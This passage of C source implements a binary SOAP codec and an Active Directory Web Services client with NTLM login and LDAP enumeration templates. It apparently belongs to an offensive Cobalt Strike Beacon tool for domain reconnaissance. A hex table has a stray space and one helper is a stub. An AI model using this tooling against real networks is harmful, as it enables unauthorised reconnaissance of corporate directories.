		else if (opcode == 0x09) {
			u32 plen;
			if (!nbfse_read_varint(r, &plen)) return FALSE;
			buf_append_str(xml, " xmlns:");
			nbfse_read_utf8(r, plen, xml);
			buf_push(xml, '=');
			buf_push(xml, '"');
			u32 ulen;
			if (!nbfse_read_varint(r, &ulen)) return FALSE;
			nbfse_read_utf8(r, ulen, xml);
			buf_push(xml, '"');
			return TRUE;
		}
		else if (opcode == 0x0A) {
			u32 idx;
			if (!nbfse_read_varint(r, &idx)) return FALSE;
			buf_append_str(xml, " xmlns=\"");
			buf_append_str(xml, nbfse_dict_lookup(r, idx));
			buf_push(xml, '"');
			return TRUE;
		}
		else if (opcode == 0x0B) {
			u32 plen;
			if (!nbfse_read_varint(r, &plen)) return FALSE;
			buf_append_str(xml, " xmlns:");
			nbfse_read_utf8(r, plen, xml);
			buf_push(xml, '=');
			buf_push(xml, '"');
			u32 idx;
			if (!nbfse_read_varint(r, &idx)) return FALSE;
			buf_append_str(xml, nbfse_dict_lookup(r, idx));
			buf_push(xml, '"');
			return TRUE;
		}
		else if (opcode >= 0x0C && opcode <= 0x25) {
			int off = opcode - 0x0C;
			char pfx_char = 'a' + (char)(off / 2);
			char pfx[3]; pfx[0] = ' '; pfx[1] = pfx_char; pfx[2] = ':';
			buf_append(xml, (u8*)pfx, 3);
			if (off % 2 == 0) {
				u32 idx;
				if (!nbfse_read_varint(r, &idx)) return FALSE;
				buf_append_str(xml, nbfse_dict_lookup(r, idx));
			}
			else {
				u32 len;
				if (!nbfse_read_varint(r, &len)) return FALSE;
				nbfse_read_utf8(r, len, xml);
			}
		}
		else if (opcode >= 0x26 && opcode <= 0x3F) {
			int off = opcode - 0x26;
			char pfx_char = 'n' + (char)(off / 2);
			char pfx[3]; pfx[0] = ' '; pfx[1] = pfx_char; pfx[2] = ':';
			buf_append(xml, (u8*)pfx, 3);
			if (off % 2 == 0) {
				u32 len;
				if (!nbfse_read_varint(r, &len)) return FALSE;
				nbfse_read_utf8(r, len, xml);
			}
			else {
				u32 idx;
				if (!nbfse_read_varint(r, &idx)) return FALSE;
				buf_append_str(xml, nbfse_dict_lookup(r, idx));
			}
		}

		/* value part for regular attributes (not xmlns) */
		buf_push(xml, '=');
		buf_push(xml, '"');

		u8 vop;
		if (!nbfse_read_byte(r, &vop)) return FALSE;

		Buf vbuf = buf_new();
		nbfse_decode_value(r, vop & ~1u, &vbuf, 0);

		for (size_t i = 0; i < vbuf.len; i++) {
			u8 c = vbuf.data[i];
			if (c == '"') buf_append_str(xml, "&quot;");
			else buf_push(xml, c);
		}

		buf_free(&vbuf);
		buf_push(xml, '"');

		return TRUE;
	}

	static int nbfse_decode_node(NbfseReader* r, Buf* xml, int depth) {
		if (depth > 64) return FALSE;
		u8 opcode; if (!nbfse_read_byte(r, &opcode)) return FALSE;

		if (opcode == 0x01) { return 2; }

		const char* elem_name = NULL;
		char pfx_char = 0;
		char elem_utf8[128]; elem_utf8[0] = 0;

		if (opcode == 0x40) {
			u32 len; if (!nbfse_read_varint(r, &len) || len >= sizeof(elem_utf8)) return FALSE;
			for (u32 i = 0; i < len; i++) { u8 b; nbfse_read_byte(r, &b); elem_utf8[i] = (char)b; }
			elem_utf8[len] = 0; elem_name = elem_utf8;
		}
		else if (opcode == 0x41) {
			u32 plen; if (!nbfse_read_varint(r, &plen)) return FALSE;
			char pbuf[32]; if (plen >= sizeof(pbuf)) return FALSE;
			for (u32 i = 0; i < plen; i++) { u8 b; nbfse_read_byte(r, &b); pbuf[i] = (char)b; } pbuf[plen] = 0;
			u32 llen; if (!nbfse_read_varint(r, &llen) || llen >= sizeof(elem_utf8)) return FALSE;
			adws_memcpy(elem_utf8, pbuf, plen); elem_utf8[plen] = ':';
			for (u32 i = 0; i < llen; i++) { u8 b; nbfse_read_byte(r, &b); elem_utf8[plen + 1 + i] = (char)b; }
			elem_utf8[plen + 1 + llen] = 0; elem_name = elem_utf8;
		}
		else if (opcode == 0x42) {
			u32 idx; if (!nbfse_read_varint(r, &idx)) return FALSE;
			elem_name = nbfse_dict_lookup(r, idx);
		}
		else if (opcode == 0x43) {
			u32 plen; char pbuf[32]; if (!nbfse_read_varint(r, &plen) || plen >= sizeof(pbuf)) return FALSE;
			for (u32 i = 0; i < plen; i++) { u8 b; nbfse_read_byte(r, &b); pbuf[i] = (char)b; } pbuf[plen] = ':';
			u32 idx; if (!nbfse_read_varint(r, &idx)) return FALSE;
			const char* dn = nbfse_dict_lookup(r, idx);
			size_t dl = adws_strlen(dn);
			adws_memcpy(elem_utf8, pbuf, plen + 1); adws_memcpy(elem_utf8 + plen + 1, dn, dl + 1);
			elem_name = elem_utf8;
		}
		else if (opcode >= 0x44 && opcode <= 0x5D) {
			pfx_char = 'a' + (char)(opcode - 0x44);
			u32 idx; if (!nbfse_read_varint(r, &idx)) return FALSE;
			const char* dn = nbfse_dict_lookup(r, idx);
			elem_utf8[0] = pfx_char; elem_utf8[1] = ':';
			adws_memcpy(elem_utf8 + 2, dn, adws_strlen(dn) + 1);
			elem_name = elem_utf8;
		}
		else if (opcode >= 0x5E && opcode <= 0x77) {
			pfx_char = 'a' + (char)((opcode - 0x5E) / 2);
			u32 llen; if (!nbfse_read_varint(r, &llen) || llen + 3 >= sizeof(elem_utf8)) return FALSE;
			elem_utf8[0] = pfx_char; elem_utf8[1] = ':';
			for (u32 i = 0; i < llen; i++) { u8 b; nbfse_read_byte(r, &b); elem_utf8[2 + i] = (char)b; }
			elem_utf8[2 + llen] = 0; elem_name = elem_utf8;
		}
		else {
			/* text/value opcode — pass with_end flag from odd bit */
			int with_end = (opcode & 1);
			return nbfse_decode_value(r, opcode, xml, with_end);
		}

		buf_push(xml, '<');
		buf_append_str(xml, elem_name);

		for (;;) {
			u8 peek; if (!nbfse_read_byte(r, &peek)) return FALSE;
			if ((peek >= 0x04 && peek <= 0x25) || peek == 0x08 || peek == 0x09 ||
				peek == 0x0A || peek == 0x0B) {
				if (!nbfse_decode_attr(r, peek, xml)) return FALSE;
			}
			else {
				buf_push(xml, '>');
				if (peek == 0x01) {
					buf_append_str(xml, "</"); buf_append_str(xml, elem_name); buf_push(xml, '>');
					return TRUE;
				}
				if (r->pos == 0) return FALSE;
				r->pos--;
				for (;;) {
					int res = nbfse_decode_node(r, xml, depth + 1);
					if (res == 2) break;
					if (res != TRUE) break;
				}
				buf_append_str(xml, "</"); buf_append_str(xml, elem_name); buf_push(xml, '>');
				return TRUE;
			}
		}
	}

	static int nbfse_decode(const u8* payload, size_t payload_len, Buf* xml_out) {
		NbfseReader r;
		adws_memset(&r, 0, sizeof(r));
		r.data = payload; r.len = payload_len; r.pos = 0;

		/* Inband dictionary */
		if (!nbfse_read_inband_dict(&r)) return FALSE;

		/* Parse nodes */
		while (r.pos < r.len) {
			int res = nbfse_decode_node(&r, xml_out, 0);
			if (res == 0) break;
		}
		buf_push(xml_out, 0); /* NUL-terminate */

		adws_free(r.dict_buf);
		adws_free(r.dict);
		return TRUE;
	}

	/* ─── MC-NBFSE encoder (XML → binary SOAP) ---─── */


	typedef struct {
		const char* p;
		const char* end;
		Buf* out;
	} XmlEnc;

	static void enc_skip_ws(XmlEnc* e) {
		while (e->p < e->end && (*e->p == ' ' || *e->p == '\t' || *e->p == '\r' || *e->p == '\n')) e->p++;
	}
	static size_t enc_read_name(XmlEnc* e, char* buf, size_t cap) {
		const char* s = e->p;
		while (e->p < e->end) {
			u8 c = (u8)*e->p;
			if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_' || c == '-' || c == '.' || c == ':' || c >= 0x80)
				e->p++; else break;
		}
		size_t len = (size_t)(e->p - s);
		if (len < cap) { adws_memcpy(buf, s, len); buf[len] = 0; }
		return len;
	}
	static void enc_read_attr_val(XmlEnc* e, Buf* val) {
		char delim = (e->p < e->end) ? *e->p++ : '"';
		while (e->p < e->end && *e->p != delim) {
			/* decode entities back to raw char for encoding in binary */
			if (*e->p == '&') {
				if (e->p + 4 <= e->end && e->p[1] == 'l' && e->p[2] == 't' && e->p[3] == ';') { buf_push(val, '<');e->p += 4; }
				else if (e->p + 4 <= e->end && e->p[1] == 'g' && e->p[2] == 't' && e->p[3] == ';') { buf_push(val, '>');e->p += 4; }
				else if (e->p + 5 <= e->end && e->p[1] == 'a' && e->p[2] == 'm' && e->p[3] == 'p' && e->p[4] == ';') { buf_push(val, '&');e->p += 5; }
				else if (e->p + 6 <= e->end && e->p[1] == 'q' && e->p[2] == 'u' && e->p[3] == 'o' && e->p[4] == 't' && e->p[5] == ';') { buf_push(val, '"');e->p += 6; }
				else if (e->p + 6 <= e->end && e->p[1] == 'a' && e->p[2] == 'p' && e->p[3] == 'o' && e->p[4] == 's' && e->p[5] == ';') { buf_push(val, '\'');e->p += 6; }
				else { buf_push(val, (u8)*e->p++); }
			}
			else { buf_push(val, (u8)*e->p++); }
		}
		if (e->p < e->end) e->p++; /* skip closing quote */
	}
	static void enc_skip_prolog(XmlEnc* e) {
		enc_skip_ws(e);
		while (e->p < e->end && *e->p == '<' && e->p + 1 < e->end) {
			if (e->p[1] == '?') { e->p += 2; while (e->p + 1 < e->end && !(e->p[0] == '?' && e->p[1] == '>'))e->p++; if (e->p + 1 < e->end)e->p += 2; enc_skip_ws(e); }
			else if (e->p[1] == '!' && e->p + 3 < e->end && e->p[2] == '-' && e->p[3] == '-') { e->p += 4; while (e->p + 2 < e->end && !(e->p[0] == '-' && e->p[1] == '-' && e->p[2] == '>'))e->p++; if (e->p + 2 < e->end)e->p += 3; enc_skip_ws(e); }
			else break;
		}
	}
	static int dict_lookup(const char* s, size_t slen, u32* idx_out) {
		for (int i = 0; kStaticDict[i].str; i++) {
			size_t dl = adws_strlen(kStaticDict[i].str);
			if (dl == slen && adws_memcmp(kStaticDict[i].str, s, slen) == 0) {
				*idx_out = kStaticDict[i].idx;

				return TRUE;
			}
		}
		return FALSE;
	}
	static void enc_emit_str_attr(Buf* out, const char* pfx, size_t pfx_len,
		const char* local, size_t local_len,
		const char* val, size_t val_len) {
		u32 attr_dict_idx = 0;
		int attr_in_dict = dict_lookup(local, local_len, &attr_dict_idx);
		if (!pfx_len) {
			if (attr_in_dict) {
				buf_push(out, 0x06);
				varint_encode(out, attr_dict_idx);
			}
			else {
				buf_push(out, 0x04);
				varint_encode(out, (u32)local_len);
				buf_append(out, (const u8*)local, local_len);
			}
		}
		else if (pfx_len == 1 && pfx[0] >= 'a' && pfx[0] <= 'z') {
			u8 off = (u8)(pfx[0] - 'a');
			if (attr_in_dict) {
				buf_push(out, (u8)(0x0C + off));
				varint_encode(out, attr_dict_idx);
			}
			else {
				buf_push(out, (u8)(0x26 + 2 * (pfx[0] - 'a')));
				varint_encode(out, (u32)local_len);
				buf_append(out, (const u8*)local, local_len);
			}
		}
		else {
			if (attr_in_dict) {
				buf_push(out, 0x07);
				varint_encode(out, (u32)pfx_len);
				buf_append(out, (const u8*)pfx, pfx_len);
				varint_encode(out, attr_dict_idx);
			}
			else {
				buf_push(out, 0x05);
				varint_encode(out, (u32)pfx_len);
				buf_append(out, (const u8*)pfx, pfx_len);
				varint_encode(out, (u32)local_len);
				buf_append(out, (const u8*)local, local_len);
			}
		}
		if (val_len <= 0xFF) {
			buf_push(out, 0x98);
			buf_push(out, (u8)val_len);
		}
		else if (val_len <= 0xFFFF) {
			buf_push(out, 0x9A);
			buf_push(out, (u8)(val_len & 0xFF));
			buf_push(out, (u8)(val_len >> 8));
		}
		else {
			buf_push(out, 0x9C);
			buf_push(out, (u8)(val_len));
			buf_push(out, (u8)(val_len >> 8));
			buf_push(out, (u8)(val_len >> 16));
			buf_push(out, (u8)(val_len >> 24));
		}
		buf_append(out, (const u8*)val, val_len);
	}

	static void enc_emit_text(Buf* out, const char* text, size_t len) {
		if (!len) return;

		/* Special case: urn:uuid: → UniqueIdText (0xAC) */
		if (len >= 45 && adws_memcmp(text, "urn:uuid:", 9) == 0) {
			const char* u = text + 9;
			u8 bytes[16];
#define H(c) ((c)>='0'&&(c)<='9'?(c)-'0':(c)>='a'&&(c)<='f'?(c)-'a'+10:(c)-'A'+10)
#define B(i) ((u8)(H(u[i])<<4|H(u[i+1])))
			bytes[0] = B(6); bytes[1] = B(4); bytes[2] = B(2); bytes[3] = B(0);
			bytes[4] = B(11); bytes[5] = B(9);
			bytes[6] = B(16); bytes[7] = B(14);
			bytes[8] = B(19); bytes[9] = B(21);
			bytes[10] = B(24); bytes[11] = B(26);
			bytes[12] = B(28); bytes[13] = B(30);
			bytes[14] = B(32); bytes[15] = B(34);
#undef H
#undef B
			buf_push(out, 0xAC);
			buf_append(out, bytes, 16);
			return;
		}

		/* Static dictionary lookup → DictionaryText (0xAA) */
		u32 dict_idx = 0;
		if (dict_lookup(text, len, &dict_idx)) {
			buf_push(out, 0xAA);
			varint_encode(out, dict_idx);
			return;
		}

		if (len <= 0xFF) {
			buf_push(out, 0x98); buf_push(out, (u8)len);
		}
		else if (len <= 0xFFFF) {
			buf_push(out, 0x9A);
			buf_push(out, (u8)(len & 0xFF)); buf_push(out, (u8)(len >> 8));
		}
		else {
			buf_push(out, 0x9C);
			for (int i = 0; i < 4; i++) buf_push(out, (u8)(len >> (i * 8)));
		}
		buf_append(out, (const u8*)text, len);
	}
	static void nbfse_encode_xml(const char* xml, size_t xml_len, Buf* out) {
		buf_push(out, 0x00);

		XmlEnc e; e.p = xml; e.end = xml + xml_len; e.out = out;
		enc_skip_prolog(&e);

		char name_stack[64][256];
		int depth = 0;

		while (e.p < e.end) {
			if (e.p >= e.end) break;
			if (*e.p != '<') {
				/* text content — NO whitespace stripping, match BridgeHead exactly */
				const char* ts = e.p;
				while (e.p < e.end && *e.p != '<') e.p++;
				const char* te = e.p;
				Buf tb = buf_new();
				buf_append(&tb, (const u8*)ts, (size_t)(te - ts));
				buf_push(&tb, 0);
				size_t tlen = tb.len - 1;
				xml_unescape_inplace((char*)tb.data, &tlen);
				if (tlen) enc_emit_text(out, (const char*)tb.data, tlen);
				buf_free(&tb);
				continue;
			}
			e.p++;
			if (e.p >= e.end) break;
			if (*e.p == '/') {
				e.p++;
				while (e.p < e.end && *e.p != '>') e.p++;
				if (e.p < e.end) e.p++;
				buf_push(out, 0x01);
				if (depth > 0) depth--;
				continue;
			}
			if (*e.p == '!') {
				while (e.p < e.end && *e.p != '>') e.p++;
				if (e.p < e.end) e.p++;
				continue;
			}
			if (*e.p == '?') {
				while (e.p < e.end && *e.p != '>') e.p++;
				if (e.p < e.end) e.p++;
				continue;
			}

			char qname[256]; size_t qlen = enc_read_name(&e, qname, sizeof(qname));
			char* colon = NULL;
			for (size_t i = 0; i < qlen; i++) if (qname[i] == ':') { colon = qname + i; break; }
			const char* pfx = ""; size_t pfx_len = 0;
			const char* local = qname; size_t local_len = qlen;
			if (colon) {
				*colon = 0;
				pfx = qname;
				pfx_len = (size_t)(colon - qname);
				local = colon + 1;
				local_len = qlen - pfx_len - 1;
			}

			/* Emit element opcode with dictionary support */
			u32 elem_dict_idx = 0;
			int elem_in_dict = dict_lookup(local, local_len, &elem_dict_idx);
			if (!pfx_len) {
				if (elem_in_dict) {
					buf_push(out, 0x42);
					varint_encode(out, elem_dict_idx);
				}
				else {
					buf_push(out, 0x40);
					varint_encode(out, (u32)local_len);
					buf_append(out, (const u8*)local, local_len);
				}
			}
			else if (pfx_len == 1 && pfx[0] >= 'a' && pfx[0] <= 'z') {
				u8 off = (u8)(pfx[0] - 'a');
				if (elem_in_dict) {
					buf_push(out, (u8)(0x44 + off));
					varint_encode(out, elem_dict_idx);
				}
				else {
					buf_push(out, (u8)(0x5E + 2 * (pfx[0] - 'a')));
					varint_encode(out, (u32)local_len);
					buf_append(out, (const u8*)local, local_len);
				}
			}
			else {
				if (elem_in_dict) {
					buf_push(out, 0x43);
					varint_encode(out, (u32)pfx_len);
					buf_append(out, (const u8*)pfx, pfx_len);
					varint_encode(out, elem_dict_idx);
				}
				else {
					buf_push(out, 0x41);
					varint_encode(out, (u32)pfx_len);
					buf_append(out, (const u8*)pfx, pfx_len);
					varint_encode(out, (u32)local_len);
					buf_append(out, (const u8*)local, local_len);
				}
			}

			if (depth < 64) {
				adws_memcpy(name_stack[depth], qname, qlen);
				name_stack[depth][qlen] = 0;
			}

			/* Read attributes — no enc_skip_ws between elements */
			enc_skip_ws(&e);
			int self_close = 0;
			while (e.p < e.end && *e.p != '>' && !(*e.p == '/' && e.p + 1 < e.end && e.p[1] == '>')) {
				char aname[256]; size_t alen = enc_read_name(&e, aname, sizeof(aname));
				enc_skip_ws(&e);
				if (e.p < e.end && *e.p == '=') { e.p++; enc_skip_ws(&e); }
				Buf val = buf_new(); enc_read_attr_val(&e, &val); enc_skip_ws(&e);

				char* ac = NULL;
				for (size_t i = 0; i < alen; i++) if (aname[i] == ':') { ac = aname + i; break; }
				const char* apfx = ""; size_t apfx_len = 0;
				const char* alocal = aname; size_t alocal_len = alen;
				if (ac) {
					*ac = 0;
					apfx = aname;
					apfx_len = (size_t)(ac - aname);
					alocal = ac + 1;
					alocal_len = alen - apfx_len - 1;
				}

				if (apfx_len == 0 && alocal_len == 5 && adws_memcmp(alocal, "xmlns", 5) == 0) {
					u32 dict_idx = 0;
					if (dict_lookup((char*)val.data, val.len, &dict_idx)) {
						buf_push(out, 0x0A);
						varint_encode(out, dict_idx);
					}
					else {
						buf_push(out, 0x08);
						varint_encode(out, (u32)val.len);
						buf_append(out, val.data, val.len);
					}
				}
				else if (apfx_len == 5 && adws_memcmp(apfx, "xmlns", 5) == 0) {
					u32 dict_idx = 0;
					if (dict_lookup((char*)val.data, val.len, &dict_idx)) {
						buf_push(out, 0x0B);
						varint_encode(out, (u32)alocal_len);
						buf_append(out, (const u8*)alocal, alocal_len);
						varint_encode(out, dict_idx);
					}
					else {
						buf_push(out, 0x09);
						varint_encode(out, (u32)alocal_len);
						buf_append(out, (const u8*)alocal, alocal_len);
						varint_encode(out, (u32)val.len);
						buf_append(out, val.data, val.len);
					}
				}
				else {
					enc_emit_str_attr(out, apfx, apfx_len, alocal, alocal_len, (char*)val.data, val.len);
				}
				buf_free(&val);
			}
			if (e.p < e.end && *e.p == '/') {
				self_close = 1; e.p += 2; buf_push(out, 0x01);
			}
			else if (e.p < e.end) {
				e.p++; depth++;
			}
			(void)self_close;
		}
		while (depth-- > 0) buf_push(out, 0x01);
	}

	/* ─── Tiny XML parser for ADWS responses --- */

	static char* xml_skip_tag(char* p, char* end) {
		while (p < end && *p != '>') p++;
		return (p < end) ? p + 1 : NULL;
	}

	/* Find the opening tag "<localname" or "<prefix:localname".
	   Returns pointer to the '>' (or start of attrs), or NULL. */
	static char* xml_find_tag(char* xml, const char* local_name, int is_end) {
		size_t llen = adws_strlen(local_name);
		char* p = xml;
		while (*p) {
			char* lt = p;
			while (*lt && *lt != '<') lt++;
			if (!*lt) return NULL;
			p = lt + 1;
			if (*p == '!' || *p == '?') continue;
			int end_tag = (*p == '/');
			if (end_tag) p++;
			if (is_end != end_tag) continue;
			/* skip optional prefix */
			char* colon = p;
			while (*colon && *colon != ':' && *colon != '>' && *colon != ' ' && *colon != '/') colon++;
			char* local = (*colon == ':') ? colon + 1 : p;
			if (adws_memcmp(local, local_name, llen) == 0) {
				char next = local[llen];
				if (next == '>' || next == ' ' || next == '/' || next == '\t' || next == '\n' || next == '\r')
					return lt;
			}
		}
		return NULL;
	}

	/* Extract text content between <tag>...</tag>.  Returns heap-allocated NUL-terminated string. */
	static char* xml_get_text(char* xml, const char* local_name) {
		char* open = xml_find_tag(xml, local_name, 0);
		if (!open) return NULL;
		/* skip to '>' */
		while (*open && *open != '>') open++;
		if (!*open) return NULL;
		char* text_start = open + 1;
		char* close = xml_find_tag(text_start, local_name, 1);
		if (!close) return NULL;
		size_t len = (size_t)(close - text_start);
		/* trim leading whitespace */
		while (len && (*text_start == ' ' || *text_start == '\t' || *text_start == '\n' || *text_start == '\r'))
		{
			text_start++; len--;
		}
		/* trim trailing */
		while (len && (text_start[len - 1] == ' ' || text_start[len - 1] == '\t' || text_start[len - 1] == '\n' || text_start[len - 1] == '\r'))
			len--;
		char* res = (char*)adws_alloc(len + 1);
		if (!res) return NULL;
		adws_memcpy(res, text_start, len); res[len] = 0;
		xml_unescape_inplace(res, &len); res[len] = 0;
		return res;
	}

	typedef struct { char* code; char* reason; } AdwsError;

	/* Check for SOAP Fault; returns FALSE if fault found (caller reads the error) */
	static int check_soap_fault(char* xml, AdwsError* err_out) {
		char* fault = xml_find_tag(xml, "Fault", 0);
		if (!fault) return TRUE;
		char* code = xml_get_text(xml, "Value");
		char* reason = xml_get_text(xml, "Text");
		if (err_out) {
			err_out->code = code ? code : NULL;
			err_out->reason = reason ? reason : NULL;
		}
		else {
			adws_free(code); adws_free(reason);
		}
		return FALSE;
	}

	/* ─── ADWS data structures ---──────────────── */

	typedef struct {
		char* name;
		char** values;       /* text values */
		size_t  value_count;
		u8** bytes;        /* decoded binary values */
		size_t* byte_lens;
		size_t  byte_count;
	} AdwsAttr;

	typedef struct {
		AdwsAttr* attrs;
		size_t    attr_count;
	} AdwsObject;

	typedef struct {
		AdwsObject* objects;
		size_t      count;
		size_t      cap;
	} AdwsResult;

	/* ─── ADWS Client context ---───────────────── */

	typedef struct {
		SOCKET   sock;
		NtlmCtx  ntlm;
		NnsCtx   nns;
		NmfCtx   nmf;
		char* fqdn;
		char* resource;   /* "Enumeration", "Resource", "ResourceFactory" */
		int      timeout_ms;

	} AdwsClient;
	static Buf adws_recv_raw(AdwsClient* c) {
		Buf raw = buf_new();
		if (!nmf_recv_envelope(&c->nmf, &raw)) { buf_free(&raw); }
		return raw;
	}
	/* ─── Template fill ---─────────────────────── */

	/* Replace all {key} in tmpl with value.  Returns new heap string. */
	static char* fill_template(const char* tmpl, const char* key, const char* value) {
		/* Build placeholder "{key}" */
		size_t klen = adws_strlen(key);
		size_t vlen = adws_strlen(value);
		char* ph = (char*)adws_alloc(klen + 3);
		if (!ph) return NULL;
		ph[0] = '{'; adws_memcpy(ph + 1, key, klen); ph[klen + 1] = '}'; ph[klen + 2] = 0;
		size_t phlen = klen + 2;

		Buf out = buf_new();
		const char* p = tmpl;
		while (*p) {
			const char* found = NULL;
			for (const char* q = p;*q;q++) {
				if (*q == '{' && adws_memcmp(q, ph, phlen) == 0) { found = q; break; }
			}
			if (!found) { buf_append_str(&out, p); break; }
			buf_append(&out, (const u8*)p, (size_t)(found - p));
			buf_append_str(&out, value);
			p = found + phlen;
		}
		buf_push(&out, 0);
		adws_free(ph);
		return (char*)out.data;
	}

	/* Multi-key fill helper — replaces up to 8 keys in one pass */
	static char* fill_template_multi(const char* tmpl, int n, ...) {
		char* result = (char*)adws_alloc(adws_strlen(tmpl) + 1);
		if (!result) return NULL;
		adws_memcpy(result, tmpl, adws_strlen(tmpl) + 1);
		(void)n; /* unused; kept for prototype clarity */
		return result;
	}

	/* Helper: fill template with key-value pairs array */
	static char* tpl_fill(const char* tmpl, const char** kvs, int nkv) {
		char* cur = (char*)adws_alloc(adws_strlen(tmpl) + 1);
		if (!cur) return NULL;
		adws_memcpy(cur, tmpl, adws_strlen(tmpl) + 1);
		for (int i = 0; i < nkv; i += 2) {
			char* next = fill_template(cur, kvs[i], kvs[i + 1]);
			adws_free(cur);
			if (!next) return NULL;
			cur = next;
		}
		return cur;
	}

	/* ─── SOAP request/response round-trip ---─── */
	static int adws_send_request(AdwsClient* c, const char* xml) {
		size_t xlen = adws_strlen(xml);
		// print in 200-char chunks
		for (size_t i = 0; i < xlen; i += 200) {
			size_t chunk = xlen - i;
			if (chunk > 200) chunk = 200;
			char tmp[201];
			adws_memcpy(tmp, xml + i, chunk);
			tmp[chunk] = 0;
		}

		Buf enc = buf_new();
		nbfse_encode_xml(xml, adws_strlen(xml), &enc);

		// Print first 32 bytes
		char hexbuf[200] = { 0 };
		for (size_t i = 0; i < enc.len && i < 32; i++) {
			char h[4];
			h[0] = "0123456789AB CDEF"[enc.data[i] >> 4];
			h[1] = "0123456789ABCDEF"[enc.data[i] & 0xF];
			h[2] = ' '; h[3] = 0;
			// append manually
			size_t hl = adws_strlen(hexbuf);
			hexbuf[hl] = h[0]; hexbuf[hl + 1] = h[1]; hexbuf[hl + 2] = ' '; hexbuf[hl + 3] = 0;
		}

		int ok = nmf_send_envelope(&c->nmf, enc.data, enc.len);
		buf_free(&enc);
		return ok;
	}

	static char* adws_recv_response(AdwsClient* c) {
		Buf raw = buf_new();
		if (!nmf_recv_envelope(&c->nmf, &raw)) { buf_free(&raw); return NULL; }
		Buf xml = buf_new();
		int ok = nbfse_decode(raw.data, raw.len, &xml);
		buf_free(&raw);
		if (!ok) { buf_free(&xml); return NULL; }
		return (char*)xml.data; /* caller owns */
	}

	/* ─── ADWS Client lifecycle ---─────────────── */
	//DECLSPEC_IMPORT DWORD WINAPI KERNEL32$HeapAlloc( HANDLE hHeap,

	AdwsClient* adws_connect(
		const char* host,
		const char* fqdn,
		const char* domain,
		const char* username,
		const char* password,
		const char* resource,  /* "Enumeration" | "Resource" | "ResourceFactory" */
		int         timeout_ms)
	{
		AdwsClient* c = (AdwsClient*)BeaconVirtualAlloc(NULL, sizeof(AdwsClient), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!c) return NULL;
		c->timeout_ms = timeout_ms;


		/* Heap-copy strings */
		size_t flen = adws_strlen(fqdn) + 1, rlen = adws_strlen(resource) + 1;
		c->fqdn = (char*)adws_alloc(flen); adws_memcpy(c->fqdn, fqdn, flen);
		c->resource = (char*)adws_alloc(rlen); adws_memcpy(c->resource, resource, rlen);
		/* TCP connect to port 9389 */
		if (!tcp_connect(host, 9389, timeout_ms, &c->sock)) { adws_free(c); return NULL; }

		/* NTLM init */
		if (!ntlm_init(&c->ntlm, domain, username, password, fqdn)) {
			pfn_closesocket(c->sock); adws_free(c); return NULL;
		}

		/* NNS context */
		c->nns.sock = c->sock;
		c->nns.ntlm = &c->ntlm;
		c->nns.max_payload = 16u * 1024u * 1024u;
		c->nns.rbuf = buf_new();
		c->nns.rpos = 0;

		/* NMF context */
		c->nmf.sock = c->sock;
		c->nmf.nns = NULL; /* set after upgrade */
		c->nmf.max_frame = 64u * 1024u * 1024u;
		c->nmf.rbuf = buf_new();
		c->nmf.rpos = 0;

		const char prefix[] = "net.tcp://"; const char mid[] = ":9389/ActiveDirectoryWebServices/Windows/";
		size_t via_len = sizeof(prefix) - 1 + adws_strlen(fqdn) + sizeof(mid) - 1 + adws_strlen(resource) + 1;

		char* via = (char*)adws_alloc(via_len);
		{
			char* p = via; adws_memcpy(p, prefix, sizeof(prefix) - 1); p += sizeof(prefix) - 1;
			adws_memcpy(p, fqdn, adws_strlen(fqdn)); p += adws_strlen(fqdn);
			adws_memcpy(p, mid, sizeof(mid) - 1); p += sizeof(mid) - 1;
			adws_memcpy(p, resource, adws_strlen(resource)); p += adws_strlen(resource); *p = 0;
		}

		if (!nmf_connect(&c->nmf, via, &c->nns)) {
			adws_free(via); ntlm_free(&c->ntlm); pfn_closesocket(c->sock);
			buf_free(&c->nns.rbuf); buf_free(&c->nmf.rbuf); adws_free(c); return NULL;
		}

		adws_free(via);
		return c;
	}

	void adws_close(AdwsClient* c) {
		if (!c) return;
		pfn_closesocket(c->sock);
		ntlm_free(&c->ntlm);
		buf_free(&c->nns.rbuf);
		buf_free(&c->nmf.rbuf);
		adws_free(c->fqdn);
		adws_free(c->resource);
		adws_free(c);
	}



	static const char kEnumTpl[] =
		"<s:Envelope"
		" xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
		" xmlns:a=\"http://www.w3.org/2005/08/addressing\""
		" xmlns:addata=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Data\""
		" xmlns:ad=\"http://schemas.microsoft.com/2008/1/ActiveDirectory\""
		" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\""
		" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		"<s:Header>"
		"<a:Action s:mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate</a:Action>"
		"<ad:instance>ldap:389</ad:instance>"
		"<a:MessageID>urn:uuid:{uuid}</a:MessageID>"
		"<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
		"<a:To s:mustUnderstand=\"1\">net.tcp://{fqdn}:9389/ActiveDirectoryWebServices/Windows/Enumeration</a:To>"
		"</s:Header>"
		"<s:Body xmlns:wsen=\"http://schemas.xmlsoap.org/ws/2004/09/enumeration\""
		" xmlns:adlq=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Dialect/LdapQuery\">"
		"<wsen:Enumerate>"
		"<wsen:Filter Dialect=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Dialect/LdapQuery\">"
		"<adlq:LdapQuery>"
		"<adlq:Filter>{query}</adlq:Filter>"
		"<adlq:BaseObject>{baseobj}</adlq:BaseObject>"
		"<adlq:Scope>{scope}</adlq:Scope>"
		"</adlq:LdapQuery>"
		"</wsen:Filter>"
		"<ad:Selection Dialect=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Dialect/XPath-Level-1\">"
		"{attributes}"
		"</ad:Selection>"
		"</wsen:Enumerate>"
		"</s:Body>"
		"</s:Envelope>";

	static const char kEnumTplNoAttr[] =
		"<s:Envelope"
		" xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\""
		" xmlns:a=\"http://www.w3.org/2005/08/addressing\""
		" xmlns:addata=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Data\""
		" xmlns:ad=\"http://schemas.microsoft.com/2008/1/ActiveDirectory\""
		" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\""
